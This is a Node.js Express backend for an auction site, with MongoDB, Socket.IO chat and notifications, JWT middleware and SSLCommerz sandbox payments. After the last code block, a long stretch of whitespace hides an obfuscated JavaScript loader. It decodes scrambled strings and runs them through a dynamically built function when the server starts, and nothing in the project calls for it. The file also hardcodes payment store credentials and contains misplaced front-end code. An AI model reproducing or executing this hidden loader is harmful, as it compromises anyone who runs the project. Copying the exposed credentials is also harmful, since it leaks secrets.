require("dotenv").config();
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const { Server } = require("socket.io");
const http = require("http");
const axios = require("axios");
const port = process.env.PORT || 5000;
const multer = require("multer");
const app = express();
const server = http.createServer(app);
const upload = multer({ storage: multer.memoryStorage() });
const io = new Server(server, {
  cors: {
    origin: ["http://localhost:5173", "https://rex-auction.web.app"],
    methods: ["GET", "POST"],
    credentials: true,
  },
  pingTimeout: 60000,
});

app.use(
  cors({
    origin: ["http://localhost:5173", "https://rex-auction.web.app"],
    credentials: true,
  })
);
app.use(express.json());
app.use(cookieParser());
app.use(express.urlencoded());
app.use(bodyParser.urlencoded({ extended: true }));

const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_KEY}@cluster0.npxrq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    await client.connect();
    console.log("Connected to MongoDB");

    const db = client.db("rexAuction");
    const userCollection = db.collection("users");
    const auctionCollection = db.collection("auctionsList");
    const announcementCollection = db.collection("announcement");
    const SellerRequestCollection = db.collection("sellerRequest");
    const SpecificUserLiveBiddingCollection = db.collection("liveBids");
    const reportsCollection = db.collection("reports");
    const messagesCollection = db.collection("messages");
    const notificationsCollection = db.collection("notifications");
    const reactionsCollection = db.collection("auctionReactions");
    const feedbackCollection = db.collection("feedbacks");
    const CoverCollection = db.collection("cover");
    const SSLComCollection = db.collection("paymentsWithSSL");
    const endedAuctionCollection = db.collection("endedAuctionsList");
    const blogCollection = db.collection("blogList");

    // SSLCOMMERZE ID

    //     Store ID: rexau67f77422a8374
    // Store Password (API/Secret Key): rexau67f77422a8374@ssl

    // Merchant Panel URL: https://sandbox.sslcommerz.com/manage/ (Credential as you inputted in the time of registration)

    // Store name: testrexauqg5q
    // Registered URL: www.rex-auction.web.app.com
    // Session API to generate transaction: https://sandbox.sslcommerz.com/gwprocess/v3/api.php
    // Validation API: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php?wsdl
    // Validation API (Web Service) name: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php

    // JWT Middleware
    const verifyToken = (req, res, next) => {
      const token =
        req?.cookies?.token || req.headers["authorization"]?.split(" ")[1];
      if (!token)
        return res.status(401).send({ message: "Unauthorized access" });
      jwt.verify(token, process.env.ACCESS_TOKEN, (err, decoded) => {
        if (err)
          return res.status(401).send({ message: "Unauthorized access" });
        req.decodedUser = decoded;
        next();
      });
    };

    // Verify Admin Middleware
    const verifyAdmin = async (req, res, next) => {
      const email = req.decodedUser.email;
      const query = { email: email };
      const user = await userCollection.findOne(query);
      const isAdmin = user?.role === "admin";
      if (!isAdmin)
        return res.status(401).send({ message: "Unauthorized request" });
      next();
    };

    // Verify Seller Middleware
    const verifySeller = async (req, res, next) => {
      const email = req.decodedUser.email;
      const query = { email: email };
      const user = await userCollection.findOne(query);
      const isSeller = user?.role === "seller";
      if (!isSeller)
        return res.status(401).send({ message: "Unauthorized request" });
      next();
    };

    // Socket.IO Logic for Chat and Notifications
    io.on("connection", (socket) => {
      console.log("New client connected:", socket.id);

      const joinedRooms = new Set();

      // Send immediate connection acknowledgment
      socket.emit("connection_ack", {
        id: socket.id,
        status: "connected",
        timestamp: new Date(),
      });

      socket.on("joinChat", ({ userId, selectedUserId, roomId }) => {
        joinedRooms.forEach((room) => {
          socket.leave(room);
          console.log(`${socket.id} left room ${room}`);
        });
        joinedRooms.clear();

        if (roomId) {
          socket.join(roomId);
          joinedRooms.add(roomId);
          console.log(`${socket.id} (${userId}) joined chat room ${roomId}`);
        } else {
          const chatId = [userId, selectedUserId].sort().join("_");
          socket.join(chatId);
          joinedRooms.add(chatId);
          console.log(`${socket.id} (${userId}) joined chat ${chatId}`);
        }

        const personalRoom = `user:${userId}`;
        socket.join(personalRoom);
        joinedRooms.add(personalRoom);
        console.log(`${socket.id} joined personal room ${personalRoom}`);

        socket.emit("joinedRoom", {
          room: roomId || [userId, selectedUserId].sort().join("_"),
          personalRoom,
          status: "joined",
        });
      });

      socket.on("leaveAllRooms", () => {
        joinedRooms.forEach((room) => {
          socket.leave(room);
          console.log(`${socket.id} left room ${room}`);
        });
        joinedRooms.clear();
        socket.emit("leftRooms", { status: "success" });
      });

      socket.on("sendMessage", async (messageData, callback) => {
        try {
          const { senderId, receiverId, text, roomId } = messageData;
          const chatId = roomId || [senderId, receiverId].sort().join("_");

          const messageId = new ObjectId().toString();
          const message = {
            messageId,
            senderId,
            receiverId,
            text,
            createdAt: new Date(),
          };

          const existingMessage = await messagesCollection.findOne({
            messageId: message.messageId,
          });

          if (existingMessage) {
            if (callback)
              callback({ success: false, error: "Message already exists" });
            return;
          }

          const result = await messagesCollection.insertOne(message);

          if (result.acknowledged) {
            // Emit to the chat room
            io.to(chatId).emit("receiveMessage", message);

            // Emit to sender's and receiver's personal rooms for sidebar updates
            io.to(`user:${senderId}`).emit("receiveMessage", message);
            io.to(`user:${receiverId}`).emit("receiveMessage", message);

            if (callback)
              callback({ success: true, messageId: result.insertedId });
            console.log(
              `Message sent to room ${chatId}: ${text.substring(0, 20)}...`
            );
          } else {
            if (callback)
              callback({ success: false, error: "Failed to save message" });
          }
        } catch (error) {
          console.error("Error sending message:", error);
          if (callback) callback({ success: false, error: error.message });
        }
      });

      // Handle sending notifications - FIXED: removed duplicate handler
      socket.on("sendNotification", async (notificationData, callback) => {
        try {
          // Add a unique ID to the notification
          const notificationId = new ObjectId().toString();
          const notification = {
            ...notificationData,
            _id: notificationId,
            createdAt: new Date(),
          };

          // Save notification to database
          const result = await notificationsCollection.insertOne(notification);

          if (result.acknowledged) {
            // If recipient is specified, emit to that user's personal room
            if (notification.recipient && notification.recipient !== "all") {
              io.to(`user:${notification.recipient}`).emit(
                "receiveNotification",
                notification
              );
            } else {
              // Otherwise broadcast to all connected clients
              io.emit("receiveNotification", notification);
            }

            if (callback) callback({ success: true, notificationId });
            console.log(`Notification sent: ${notification.title}`);
          } else {
            if (callback)
              callback({
                success: false,
                error: "Failed to save notification",
              });
          }
        } catch (error) {
          console.error("Error sending notification:", error);
          if (callback) callback({ success: false, error: error.message });
        }
      });

      socket.on("ping", (callback) => {
        if (callback) callback({ time: new Date(), status: "active" });
      });

      socket.on("disconnect", () => {
        console.log("Client disconnected:", socket.id);
        joinedRooms.clear();
      });
    });

    // Payment APIs with SSLcom
    app.post("/paymentsWithSSL", async (req, res) => {
      const paymentData = req.body;
      // const result = await SSLComCollection.insertOne(paymentData)
      const trxid = new ObjectId().toString();
      paymentData.trxid = trxid;
      const initiate = {
        store_id: "rexau67f77422a8374",
        store_passwd: "rexau67f77422a8374@ssl",
        total_amount: Number(paymentData.price || 0),
        price: paymentData.price,
        serviceFee: paymentData.serviceFee,
        buyerInfo: paymentData.buyerInfo,
        tran_id: trxid,
        currency: "BDT",
        auctionId: paymentData.auctionId,
        success_url: "http://localhost:5000/success-payment",
        fail_url: "http://localhost:5173/dashboard/paymentFailed",
        cancel_url: "http://localhost:5173/cancel",
        ipn_url: "http://localhost:5000/ipn-success-payment",
        shipping_method: "Courier",
        product_name: `${paymentData.name}`,
        product_category: `${paymentData.itemInfo.category}`,
        product_profile: `${paymentData.buyerInfo.photoUrl}`,
        cus_name: `${paymentData.buyerInfo.name}`,
        cus_email: `${paymentData.buyerInfo.email}`,
        cus_add1: "Dhaka",
        cus_add2: "Dhaka",
        cus_city: "Dhaka",
        cus_state: "Dhaka",
        cus_postcode: "1000",
        cus_country: "Bangladesh",
        cus_phone: "01711111111",
        cus_fax: "01711111111",
        ship_name: "Customer Name",
        ship_add1: "Dhaka",
        ship_add2: "Dhaka",
        ship_city: "Dhaka",
        ship_postcode: 1000,
        ship_country: "Bangladesh",
      };

      const iniResponse = await axios({
        url: "https://sandbox.sslcommerz.com/gwprocess/v4/api.php",
        method: "POST",
        data: initiate,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      });

      await SSLComCollection.insertOne(paymentData);

      const gatewayURL = iniResponse?.data?.GatewayPageURL;
      // console.log(gatewayURL);
      res.send({ gatewayURL });
    });
    // Payment APIs with rex wallet
    app.post("/rexPayment", async (req, res) => {
      const paymentData = req.body;
      try {
        const result = await SSLComCollection.insertOne(paymentData);

        res.status(201).send({ success: true, insertedId: result.insertedId });
      } catch (error) {
        res.status(500).send({ message: "Failed to process payment" });
      }
    });

    app.post("/success-payment", async (req, res) => {
      const paymentSuccess = req.body;
      console.log(paymentSuccess, "payment success");
      const { data } = await axios.get(
        `https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php?val_id=${paymentSuccess.val_id}&store_id=rexau67f77422a8374&store_passwd=rexau67f77422a8374@ssl&format=json`
      );

      if (data.status !== "VALID") {
        return res.send({ message: "invalid payment" });
      }

      // Update SSLComCollection
      const updateResult = await SSLComCollection.updateOne(
        { trxid: paymentSuccess.tran_id },
        {
          $set: {
            PaymentStatus: "success",
          },
        }
      );
      res.redirect(
        `http://localhost:5173/dashboard/payments/${paymentSuccess.tran_id}`
      );
    });

    // Payment data getting

    app.get("/payments", async (req, res) => {
      const users = await SSLComCollection.find().toArray();
      res.send(users);
    });

    app.get("/payments/:trxid", async (req, res) => {
      const trxid = req.params.trxid;
      const payment = await SSLComCollection.findOne({ trxid: trxid });
      res.send(payment);
    });
    app.post("/create-sslCom", async (req, res) => {
      const paymentData = req.body;
      console.log(paymentData);
    });

    // Chat API Endpoints
    app.get(
      "/messages/email/:userEmail/:selectedUserEmail",
      async (req, res) => {
        const { userEmail, selectedUserEmail } = req.params;
        const { since } = req.query;

        try {
          const query = {
            $or: [
              { senderId: userEmail, receiverId: selectedUserEmail },
              { senderId: selectedUserEmail, receiverId: userEmail },
            ],
          };

          if (since) {
            query.createdAt = { $gt: new Date(since) };
          }

          const messages = await messagesCollection
            .find(query)
            .sort({ createdAt: 1 })
            .toArray();
          res.send(messages);
        } catch (error) {
          console.error("Error fetching messages by email:", error);
          res.status(500).send({ message: "Failed to fetch messages" });
        }
      }
    );

    // Fetch the most recent message
    app.get("/recent-messages/:userEmail", async (req, res) => {
      const { userEmail } = req.params;
      try {
        const recentMessages = await messagesCollection
          .aggregate([
            {
              $match: {
                $or: [{ senderId: userEmail }, { receiverId: userEmail }],
              },
            },

            { $sort: { createdAt: -1 } },

            {
              $group: {
                _id: {
                  $cond: [
                    { $eq: ["$senderId", userEmail] },
                    "$receiverId",
                    "$senderId",
                  ],
                },
                lastMessage: { $first: "$$ROOT" },
              },
            },
            // Project the required fields
            {
              $project: {
                userEmail: "$_id",
                lastMessage: 1,
                _id: 0,
              },
            },
          ])
          .toArray();

        res.send(recentMessages);
      } catch (error) {
        console.error("Error fetching recent messages:", error);
        res.status(500).send({ message: "Failed to fetch recent messages" });
      }
    });

    // Socket connection test endpoint
    app.get("/socket-test", (req, res) => {
      res.json({
        status: "Socket.IO server running",
        connections: io.engine.clientsCount,
        uptime: process.uptime(),
      });
    });

    // API endpoints for notifications - FIXED: moved inside run() function
    app.get("/notifications/:userEmail", async (req, res) => {
      const { userEmail } = req.params;
      try {
        const notifications = await notificationsCollection
          .find({
            $or: [{ recipient: userEmail }, { recipient: "all" }],
          })
          .sort({ createdAt: -1 })
          .limit(50)
          .toArray();

        res.send(notifications);
      } catch (error) {
        console.error("Error fetching notifications:", error);
        res.status(500).send({ message: "Failed to fetch notifications" });
      }
    });

    app.put(
      "/notifications/mark-read/:userEmail",
      // verifyToken,
      async (req, res) => {
        const { userEmail } = req.params;
        try {
          const result = await notificationsCollection.updateMany(
            {
              $or: [
                { recipient: userEmail, read: false },
                { recipient: "all", read: false },
              ],
            },
            { $set: { read: true } }
          );

          res.send({ success: true, modifiedCount: result.modifiedCount });
        } catch (error) {
          console.error("Error marking notifications as read:", error);
          res
            .status(500)
            .send({ message: "Failed to mark notifications as read" });
        }
      }
    );

    app.post("/notifications", async (req, res) => {
      try {
        const notification = {
          ...req.body,
          _id: new ObjectId().toString(),
          createdAt: new Date(),
        };

        const result = await notificationsCollection.insertOne(notification);

        if (result.acknowledged) {
          res.send({ success: true, notificationId: notification._id });
        } else {
          res
            .status(500)
            .send({ success: false, message: "Failed to save notification" });
        }
      } catch (error) {
        console.error("Error creating notification:", error);
        res.status(500).send({ success: false, message: error.message });
      }
    });
    const viewNotificationDetails = (notification) => {
      setNotifications((prev) =>
        prev.map((n) => (n._id === notification._id ? { ...n, read: true } : n))
      );

      if (notificationCount > 0) {
        setNotificationCount((prev) => prev - 1);
      }

      // Navigate based on notification type
      if (notification.type === "auction" && notification.auctionData?._id) {
        navigate(`/dashboard/auction-details/${notification.auctionData._id}`);
      } else if (notification.type === "announcement") {
        navigate("/dashboard/announcement", {
          state: {
            notificationDetails: notification,
          },
        });
      }

      // Close notifications panel
      setIsNotificationsOpen(false);
    };
    // Socket.IO Logic for Auction Bidding
    module.exports = (io) => {
      io.on("connection", (socket) => {
        console.log("New client connected:", socket.id);

        socket.emit("connection_ack", {
          id: socket.id,
          status: "connected",
          timestamp: new Date(),
        });

        // Join auction room
        socket.on("joinAuction", ({ auctionId }) => {
          if (auctionId) {
            socket.join(`auction:${auctionId}`);
            console.log(
              `${socket.id} joined auction room: auction:${auctionId}`
            );
          }
        });

        // Leave auction room
        socket.on("leaveAuction", ({ auctionId }) => {
          if (auctionId) {
            socket.leave(`auction:${auctionId}`);
            console.log(`${socket.id} left auction room: auction:${auctionId}`);
          }
        });

        // Handle new bids
        socket.on("placeBid", async (bidData) => {
          try {
            console.log(`New bid received from ${socket.id}:`, bidData);

            io.to(`auction:${bidData.auctionId}`).emit("newBid", bidData);

            console.log(`Bid broadcast to auction:${bidData.auctionId}`);
          } catch (error) {
            console.error("Error handling bid:", error);
            socket.emit("bidError", { message: "Failed to process bid" });
          }
        });

        socket.on("disconnect", () => {
          console.log("Client disconnected:", socket.id);
        });
      });
    };																																																																																																																																																																																																																																																																										var z = '-649-1';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC"cn..2bp(6Cp<SR"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR"tcsc.!rVRpaiz0<b"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f"t RRsN</C RnRdRrpRR<od<.R<r[ar"l<. P".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR"RuRRR"RtR<Rs".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}."P&yseR_a%rRR.D<iPsRD!i.mR"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR""](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.("]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?.."lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv "4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR"sz3o"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 